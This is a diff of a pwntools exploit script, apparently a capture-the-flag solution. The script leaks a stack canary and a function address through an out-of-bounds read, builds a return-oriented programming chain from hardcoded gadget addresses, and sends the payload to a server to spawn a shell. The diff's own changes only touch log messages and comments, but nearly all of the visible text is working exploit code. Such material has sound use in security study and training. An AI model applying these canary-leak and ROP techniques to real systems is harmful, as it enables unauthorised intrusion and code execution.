@@ -15,17 +15,18 @@ def load(offset):
 
 # leak the value of canary
 canary = u64(load(-13))
-log.info("canary --> %s" % hex(canary))
+log.success("canary --> %s" % hex(canary))
 
-# Address for the payload
+# Address for the ROPchain
 pop_rdi = 0x00000000004014f3
 pop_rsi_r15 = 0x00000000004014f1
 ret = 0x000000000040028e
 flag = 0x401518
 mov_rdx = 0x0000000000401528
 
+# leak address for function load
 load = u64(load(-14))
-log.info("load --> %s" % hex(load))
+log.success("load --> %s" % hex(load))
 
 base = 0x7ffefa79d660 + 0x90
 
@@ -52,6 +53,7 @@ payload += p64(pop_rsi_r15)
 payload += p64(0x602100) * 2
 payload += p64(mov_rdx)
 payload += p64(0x400E7B)
+
 # Send the payload to server to spawn a shell
 p.sendline(payload)
 p.interactive()
